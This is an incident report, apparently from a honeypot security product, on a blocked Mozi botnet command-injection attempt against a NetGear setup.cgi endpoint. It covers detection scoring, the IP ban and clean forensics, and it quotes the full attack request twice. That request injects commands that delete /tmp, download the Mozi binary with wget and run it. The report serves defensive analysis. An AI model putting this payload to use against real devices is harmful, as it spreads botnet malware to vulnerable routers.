# Incident Report — Mozi Botnet RCE Attempt (Honeypot Capture)

## TL;DR

A worm payload tried to exploit a NetGear router command injection against
the honeypot. Sentry's `CmdInjection` heuristic matched the attack string in
the query, scored the request **88/100 (critical)**, the edge **blocked it
with 403 before it ever reached the upstream**, the source IP was banned for
24h, and post-incident forensics confirmed **zero execution and zero
compromise**. Detection → enforcement → containment → clean bill of health,
fully automatic.

## Event summary

| Field | Value |
| --- | --- |
| Timestamp | 2026-10-10 23:23:59 UTC |
| Source | `http_proxy` (inline edge, port 80) |
| Attacker | `27.43.205.xxx` (masked) |
| Method / Path | `GET /setup.cgi` |
| Risk score | 88 — **critical** |
| Verdict | **block** (HTTP 403) |
| Upstream reached | No (`upstream_time_ms: null`) |
| Aftermath | IP banned 24h (`ip_state`, reason `rce`), incident opened |

## The payload

```
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd
    &cmd=rm -rf /tmp/*;wget http://192.168.1.1:8088/Mozi.m -O /tmp/netgear;sh netgear
    &curpath=/&currentsetting.htm=1
```

This is the signature propagation attempt of the **Mozi botnet**: a command
injection against NetGear routers via `setup.cgi?todo=syscmd`
(CVE-2016-1555 family). The worm sprays it blind against every HTTP endpoint
it can find — `192.168.1.1:8088` is the infected router's own gateway, part
of Mozi's standard download chain. No User-Agent was sent, another tell of
automated malware.

## How Sentry caught it

The pipeline ran rules → heuristics → scoring on the request, entirely at
the edge:

1. **`CmdInjection` heuristic** — the query is URL-decoded and matched
   against a command-injection pattern; `;wget http://...` fired. Signal
   `rce`, weight **70**.
2. **`suspicious_u_a`** — missing User-Agent, weight **10**.
3. **`unknown_route`** — `/setup.cgi` is not a learned/known route on this
   deployment, weight **8**.

Total: **88/100 → critical → verdict `block`**. The edge generated a 403
response and never proxied the request to the decoy backend.

## Containment

- The block verdict was mirrored to `ip_state`: source IP **banned for
  24h** with reason `rce`. Any follow-up traffic dies at the edge fast-path
  (no pipeline run, no event spam).
- An incident was opened automatically for the event.
- The edge block table denied the IP before TCP/pipeline processing on
  subsequent connections.

## Post-incident forensics (all clean)

Verification performed that nothing executed and nothing escaped:

| Check | Result |
| --- | --- |
| Upstream access log | **0 hits** for `setup.cgi` — request never left the edge |
| `/tmp` in every container + host | Empty — no `Mozi.m` / `netgear` artifacts |
| Container processes | Only nginx workers and the SSH decoy `sshd` |
| Outbound connections | None to any C2 — only internal DB traffic |
| Persistence (cron, authorized_keys, units) | Clean |
| Real SSH logins | Owner's key only |

## Why this demonstrates effectiveness

- **Detection works on real malware, not lab traffic.** Mozi is a live
  worm payload, caught by a generic command-injection heuristic — no
  signature for "Mozi" exists in the codebase.
- **Enforcement is inline.** The 403 was served by the edge itself; the
  vulnerable-looking surface (the decoy) never saw the request.
- **Containment is automatic and sticky.** One bad request → 24h IP ban,
  no operator in the loop.
- **Forensics are built in.** Every claim above is backed by persisted
  events, edge metrics and container state — the investigation took
  minutes, not days.

> Signal detail recorded on the event:
> `matched in: next_file=netgear.cfg&todo=syscmd&cmd=rm -rf /tmp/*;
> wget http://192.168.1.1:8088/Mozi.m -O /tmp/netgear;sh netgear...`
